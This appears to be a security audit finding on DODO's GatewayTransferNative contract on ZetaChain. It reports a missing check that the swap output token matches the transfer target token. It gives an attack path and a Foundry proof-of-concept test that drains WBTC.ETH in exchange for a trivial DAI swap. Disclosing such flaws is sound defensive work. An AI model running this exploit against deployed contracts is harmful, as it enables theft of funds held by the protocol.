# Missing `params.toToken == decoded.targetZRC20` Validation in `GatewayTransferNative.onCall` Leads to Misattributed `outputAmount` and Potential Theft

### Summary

After an internal DODO swap within [`GatewayTransferNative.onCall`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L394-L421), the function uses the swap's `outputAmount` which is the amount of `params.toToken` from the user payload to transfer tokens to a recipient on ZetaChain. However, the token for this final transfer is determined by `decoded.targetZRC20` also from user payload. The `GatewayTransferNative` lacks a crucial check to ensure `params.toToken == decoded.targetZRC20`. If an attacker sets these to different tokens, `GatewayTransferNative` will misinterpret `outputAmount` as the amount of `decoded.targetZRC20`, attempting to transfer `decoded.targetZRC20` from its own balance. This can lead to theft.

### Root Cause

The bug occurs due to a missing validation step after the DODO swap in `GatewayTransferNative.onCall` and before the final native transfer on ZetaChain.

1.  **User-Controlled Swap Output and Final Target Token:** `onCall` decodes the user payload via `SwapDataHelperLib.decodeNativeMessage`. `decoded.swapData` defines `params.toToken`. `decoded.targetZRC20` defines the token type intended for the final transfer to the `receiver` on ZetaChain. Both `params.toToken` and `decoded.targetZRC20` are attacker-controlled.

2.  **Swap Execution:** If `decoded.swapData` is not empty, `_doMixSwap` performs a swap, outputting `outputAmount` which is a quantity of `params.toToken`.

    ```solidity
    uint256 outputAmount = _doMixSwap(decoded.swapData, amountAfterFee, params); // outputAmount is the amount of params.toToken
    ```

3.  **Final Transfer:** The function then uses `outputAmount` to transfer `decoded.targetZRC20` to the `receiver`.
    ```solidity
    // src/GatewayTransferNative.sol#L352-L357
    if (decoded.targetZRC20 == WZETA) {
        // @audit Problem: outputAmount is the amount of params.toToken, not necessarily WZETA.
        // If params.toToken is not WZETA, this IWETH9(WZETA).withdraw call is on a wrong token type.
        IWETH9(WZETA).withdraw(outputAmount); 
        TransferHelper.safeTransferETH(receiver, outputAmount); // Attempts to send native ZETA based on outputAmount quantity
    } else {
        // @audit Problem: outputAmount is the amount of params.toToken.
        // This tries to transfer 'outputAmount' of 'decoded.targetZRC20' from contract's balance.
        TransferHelper.safeTransfer(decoded.targetZRC20, receiver, outputAmount); 
    }
    ```
    **No check ensures `params.toToken == decoded.targetZRC20`.** If `params.toToken` is different from `decoded.targetZRC20`, then `outputAmount` is incorrectly used as the quantity for transferring `decoded.targetZRC20` from `GatewayTransferNative`'s own balance.

### Internal Pre-conditions

1.  `GatewayTransferNative` must hold a sufficient balance of `decoded.targetZRC20` that the attacker intends to drain by misrepresenting its amount via `outputAmount`. This is plausible due to its refund mechanism.
2.  The initial DODO swap from the deposited `zrc20` to `params.toToken` must be feasible.

### External Pre-conditions

1.  DODO protocol on ZetaChain has liquidity for the swap that produces `params.toToken`.

### Attack Path

1.  **Pre-condition:** `GatewayTransferNative` holds `1 WBTC.ETH` (8 decimals, `1e8`). Attacker has some `DAI` (18 decimals).
2.  **Attacker's Action:** Initiates a cross-chain transaction via `GatewaySend.depositAndCall` targeting `GatewayTransferNative` on ZetaChain.
    *   Attacker deposits `1e8` wei of `DAI` (becomes `zrc20 = DAI.ETH`, `amount = 1e8` in `onCall`).
    *   The `payload` for `onCall` (decoded by `SwapDataHelperLib.decodeNativeMessage`) is crafted:
        *   `decoded.targetZRC20 = WBTC.ETH`.
        *   `decoded.receiver = attackerAddress`.
        *   `decoded.swapData` (which yields `params` for `_doMixSwap`):
            *   `params.fromToken = DAI.ETH` (matches `zrc20`).
            *   `params.toToken = DAI.ETH` This can be any low value tokens, DAI->DAI for simplicity.
3.  **Execution within `GatewayTransferNative.onCall`:**
    *   `onCall` receives `amount = 1e8` of `zrc20 = DAI.ETH`. Assume fees is zero and `amountAfterFee` remains `1e8`.
    *   `_doMixSwap(decoded.swapData, 1e8, params)` is called. Since `params.fromToken` is `DAI.ETH` and `params.toToken` is `DAI.ETH`, `outputAmount` is `1e8`.
    *   The `if (decoded.targetZRC20 != WZETA)` else branch is taken because `decoded.targetZRC20` is `WBTC.ETH`.
    *   `TransferHelper.safeTransfer(decoded.targetZRC20, receiver, outputAmount)` is called. This attempts to `transfer` `outputAmount` of `decoded.targetZRC20`. 
4.  **Result**: `GatewayTransferNative` loses `1e8` wei or `1 WBTC.ETH`. The attacker effectively "paid" with `1e8` wei of `DAI` (worth less than $0.01) because the DODO swap was DAI-to-DAI, and the `outputAmount` from that was then misattributed to `WBTC.ETH`. The attacker receives `WBTC.ETH` on ZetaChain.

### Impact

If `params.toToken` is different from `decoded.targetZRC20`, the contract misinterprets `outputAmount`. This can lead to theft of valuable ZRC20 tokens (including WZETA) held by `GatewayTransferNative`, often those accumulated via its refund mechanism. The attacker receives these drained funds as the `decoded.targetZRC20` type on ZetaChain.

### PoC


Add the following test in `test/GatewayTransferNative.t.sol` file:

```solidity

/// @dev This bug allows anyone to drain arbitary targetZRC20 from GatewayTransferNative
/// @custom:command forge test --match-contract GatewayTransferNativeTest --match-test test_SwapToTokenTargetZRC20 --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public
function test_SwapToTokenTargetZRC20() public {
    address attacker = makeAddr("attacker");
    address targetContract = address(gatewayTransferNative);

    // Assets
    ERC20Mock dai = new ERC20Mock("DAI", "DAI", 18);
    ZRC20Mock zrc20DAI = new ZRC20Mock("ZetaChain DAI Ethereum", "DAI.ETH", 18);
    ZRC20Mock zrc20WBTC = new ZRC20Mock("ZetaChain WBTC Ethereum", "WBTC.ETH", 8);
    uint256 amount = 1e8;

    // Balances
    dai.mint(attacker, amount); // 0.00xxx DAI
    zrc20DAI.mint(address(gatewayZEVM), amount); // Deposited DAI.ETH on ZetaChain
    zrc20WBTC.mint(targetContract, amount); // 1 WBTC.ETH e.g. for refund failed cross-chain tx

    // Aprovals
    vm.prank(attacker);
    dai.approve(address(gatewaySendA), amount);

    uint32 dstChainId = 7000;
    address asset = address(dai);
    address targetZRC20 = address(zrc20WBTC); // !!!!
    bytes memory sender = abi.encodePacked(attacker);
    bytes memory receiver = abi.encodePacked(attacker);

    // 1 DAI = 1 DAI, no slippage for simplicity
    dodoRouteProxyZ.setPrice(address(zrc20DAI), address(zrc20DAI), 1e18);

    // Gateways
    gatewayA.setZRC20(address(dai), address(zrc20DAI));

    // Swaps DAI to DAI for simplicity, it can be any low value tokens
    bytes memory swapDataZ = encodeCompressedMixSwapParams(
        address(zrc20DAI),
        address(zrc20DAI),
        amount,
        0,
        0,
        new address[](1),
        new address[](1),
        new address[](1),
        0,
        new bytes[](1),
        abi.encode(address(0), 0),
        block.timestamp + 600
    );
    bytes memory payload = encodeNativeMessage(targetZRC20, sender, receiver, swapDataZ);

    vm.prank(attacker);
    gatewaySendA.depositAndCall(targetContract, amount, asset, dstChainId, payload);

    assertEq(dai.balanceOf(attacker), 0);
    assertEq(zrc20WBTC.balanceOf(attacker), amount);
}
```

### Mitigation

Ensure the token of `outputAmount` matches what the final transfer logic expects.
